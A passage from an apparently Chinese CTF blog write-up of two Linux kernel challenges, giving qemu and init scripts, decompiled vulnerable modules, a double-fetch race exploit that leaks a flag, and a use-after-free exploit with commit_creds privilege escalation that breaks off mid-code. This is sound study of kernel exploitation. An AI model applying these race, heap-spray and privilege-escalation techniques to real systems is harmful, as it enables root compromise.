<h2 id="0x3-level3"><a href="#0x3-level3" class="headerlink" title="0x3 level3"></a>0x3 level3</h2><h3 id="0x3-1-start-sh"><a href="#0x3-1-start-sh" class="headerlink" title="0x3.1 start.sh"></a>0x3.1 start.sh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M -smp 2,cores=2,threads=1  \</span><br><span class="line">-kernel ./vmlinuz-4.15.0-22-generic \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot; \</span><br><span class="line">-cpu qemu64 \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>

<p>其中<code>-smp 2,cores=2,threads=1</code>的作用如下</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220406200817128.png" alt="image-20220406200817128"></p>
<p>也就是说这个内核可以开至多两个线程了。</p>
<h3 id="0x3-2-init"><a href="#0x3-2-init" class="headerlink" title="0x3.2 init"></a>0x3.2 init</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">echo &quot;flag&#123;this_is_a_sample_flag&#125;&quot; &gt; flag</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod baby.ko</span><br><span class="line">chmod 777 /dev/baby</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<h3 id="0x3-3-ko文件"><a href="#0x3-3-ko文件" class="headerlink" title="0x3.3 ko文件"></a>0x3.3 ko文件</h3><p>一个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">baby_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp-5Ch] [rbp-5Ch]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v5 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">26214</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">4919</span></span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(v2, <span class="number">16LL</span>, *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">4952</span>))</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(</span><br><span class="line">               *(_QWORD *)v5,</span><br><span class="line">               *(<span class="keyword">int</span> *)(v5 + <span class="number">8</span>),</span><br><span class="line">               *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">4952</span>))</span><br><span class="line">         &amp;&amp; *(_DWORD *)(v5 + <span class="number">8</span>) == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v5 + i) != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">14LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析：允许传入一个结构体的指针，结构体长这个样子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">message</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">&#125;m;</span><br></pre></td></tr></table></figure>

<p>他会检查buf+len的地址又没有超出用户态的最高地址，如果超出了就会退出，如果没有超出就会拿buf的字符一个个和flag比对，如果全部比对成功就会返回flag值。</p>
<p>漏洞利用：这个内核允许开两个线程，所以可以利用这一点，主线程传入正常的m然后开启一个支线程一直修改m的buf为flag_addr,这样支线程就有几率当主线程刚检查完m后支线程修改m.buf=flag_addr,这样就能比对成功输出flag值了。</p>
<h3 id="0x3-4"><a href="#0x3-4" class="headerlink" title="0x3.4"></a>0x3.4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">message</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">&#125;m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_flag_addr</span><span class="params">(<span class="keyword">size_t</span> flag_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        m.buf=flag_addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>,<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg |grep &#x27;Your flag is at &#x27; &gt; ./flag_addr.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> temp_fd=open(<span class="string">&quot;./flag_addr.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(<span class="string">&quot;[    2.817016] Your flag is at &quot;</span>);</span><br><span class="line">    read(temp_fd,buf,<span class="number">100</span>);</span><br><span class="line">    close(temp_fd);</span><br><span class="line">    <span class="keyword">size_t</span> flag_addr=strtoull(buf+len,buf+len+<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag_addr:%d\n&quot;</span>,flag_addr);</span><br><span class="line">    m.buf=buf;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        m.len=i;</span><br><span class="line">        ret=ioctl(fd,<span class="number">0x1337</span>,&amp;m);</span><br><span class="line">        <span class="keyword">if</span>(ret==<span class="number">22</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;flag_len:%d\n&quot;</span>,i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    pthread_create(&amp;tid,<span class="literal">NULL</span>,change_flag_addr,flag_addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100000</span>;i++)&#123;</span><br><span class="line">        m.buf=buf;</span><br><span class="line">        ret=ioctl(fd,<span class="number">0x1337</span>,&amp;m);</span><br><span class="line">        <span class="keyword">if</span>(ret==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;susses\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    system(<span class="string">&quot;dmesg |grep &#x27;Looks like the flag is&#x27; &gt; ./flag.txt&quot;</span>);</span><br><span class="line">    temp_fd=open(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    read(temp_fd,buf,<span class="number">100</span>);</span><br><span class="line">    write(STDOUT_FILENO,buf,<span class="number">100</span>);</span><br><span class="line">    close(temp_fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x3-5-收获"><a href="#0x3-5-收获" class="headerlink" title="0x3.5 收获"></a>0x3.5 收获</h3><p>1.第一次做多线程的内核题，主要利用姿势就是通过主线程完成检查后支线程修改数据。</p>
<p>2.strtoull函数，第一个参数是要转换字符串的首地址，第二个是要转换的字符串的最后一个地址的后一个地址，第三个参数是进制，返回一个8字节数。</p>
<h2 id="0x4-level4"><a href="#0x4-level4" class="headerlink" title="0x4 level4"></a>0x4 level4</h2><h3 id="0x4-1-start-sh"><a href="#0x4-1-start-sh" class="headerlink" title="0x4.1 start.sh"></a>0x4.1 start.sh</h3><p>保护全开，本地调试的时候先关闭kaslr.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">stty intr ^]</span><br><span class="line">cd `dirname $0`</span><br><span class="line">timeout --foreground 600 qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#x27;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&#x27; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h3 id="0x4-2-init"><a href="#0x4-2-init" class="headerlink" title="0x4.2 init"></a>0x4.2 init</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">echo &quot;IF8gIF9fICAgICAgICAgICAgICAgXyAgICAgICAgICBfICAgICAKfCB8LyAvX19fICBfX18gXyBfXyB8IHwgICAgX18gX3wgfF9fICAKfCAnIC8vIF8gXC8gXyBcICdfIFx8IHwgICAvIF9gIHwgJ18gXCAKfCAuIFwgIF9fLyAgX18vIHwgfCB8IHxfX3wgKF98IHwgfF8pIHwKfF98XF9cX19ffFxfX198X3wgfF98X19fX19cX18sX3xfLl9fLyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK&quot; | base64 -d</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount /dev/pts</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/baby.ko</span><br><span class="line">chmod 644 /dev/baby</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">cd /home/pwn</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">umount /proc</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>0x4.3 ko文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_0</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// r13</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// r12</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v3 = v2;</span><br><span class="line">  v4 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">4</span>], <span class="number">6291648LL</span>, <span class="number">16LL</span>);</span><br><span class="line">  copy_from_user(v4, v3, <span class="number">16LL</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">24584</span>:</span><br><span class="line">      v12 = *(<span class="keyword">int</span> *)(v4 + <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v12 &lt;= <span class="number">0x1F</span> &amp;&amp; qword_6C0[v12] )</span><br><span class="line">        ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))kfree)();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">24585</span>:</span><br><span class="line">      v10 = *(<span class="keyword">int</span> *)(v4 + <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v10 &lt;= <span class="number">0x1F</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = qword_6C0[v10];</span><br><span class="line">        <span class="keyword">if</span> ( v11 )</span><br><span class="line">          (*(<span class="keyword">void</span> (__fastcall **)(_QWORD, __int64, __int64))(v11 + <span class="number">64</span>))(*(_QWORD *)(v11 + <span class="number">56</span>), v11, <span class="number">72LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">24583</span>:</span><br><span class="line">      v6 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = (<span class="keyword">int</span>)v6;</span><br><span class="line">        <span class="keyword">if</span> ( !qword_6C0[v6] )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( ++v6 == <span class="number">32</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">      &#125;</span><br><span class="line">      v8 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">1</span>], <span class="number">6291648LL</span>, <span class="number">72LL</span>);</span><br><span class="line">      v9 = *(_QWORD *)v4;</span><br><span class="line">      qword_6C0[v7] = v8;</span><br><span class="line">      *(_QWORD *)(v8 + <span class="number">64</span>) = &amp;copy_to_user;</span><br><span class="line">      *(_QWORD *)(v8 + <span class="number">56</span>) = v9;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_4:</span><br><span class="line">  kfree(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现会申请72字节，根据上一篇slub的分析可知，申请72字节的话其实会分配给你96字节的，也就是0x60,申请完在这个堆里填入一个函数地址然后后面会调用这个地址，所以如果能覆盖这个地址就能拿到程序流了，后面free这个堆的时候没有清除指针，存在uaf,所以可以利用堆喷申请内核堆，申请0x10000肯定能申请到刚才free的堆，然后把那个堆的函数指针覆盖就可以了,这里采用sendmsg进行堆喷。</p>
<h3 id="0x4-4-exp"><a href="#0x4-4-exp" class="headerlink" title="0x4.4 exp"></a>0x4.4 exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">really_addr</span><span class="params">(<span class="keyword">size_t</span> addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> vmlinux_addr+addr-vmlinux_nokaslr_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up_power</span><span class="params">()</span></span>&#123;</span><br><span class="line">    (*((<span class="keyword">void</span> (*)(<span class="keyword">char</span> *))commit_creds))((*((<span class="keyword">char</span>* (*)(<span class="keyword">int</span>))prepare_kernel_cred))(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">input</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">&#125;input;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6007</span>,&amp;input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6009</span>,&amp;input);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6008</span>,&amp;input);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    input.buf=(<span class="keyword">size_t</span> *)<span class="built_in">malloc</span>(<span 